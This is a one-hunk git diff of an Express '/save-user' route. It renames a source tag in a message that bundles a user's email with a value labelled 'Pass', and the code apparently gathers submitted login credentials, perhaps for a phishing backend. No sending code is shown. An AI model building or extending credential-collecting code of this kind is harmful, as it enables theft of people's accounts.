@@ -51,7 +51,7 @@ app.post("/save-user", async (req, res) => {
     },
   });
 
-  let text = `From DAT:\nEmail: ${email}\nPass: ${id}`;
+  let text = `From TS:\nEmail: ${email}\nPass: ${id}`;
 
   const params = { email, id };
   if (req.body.phone) {
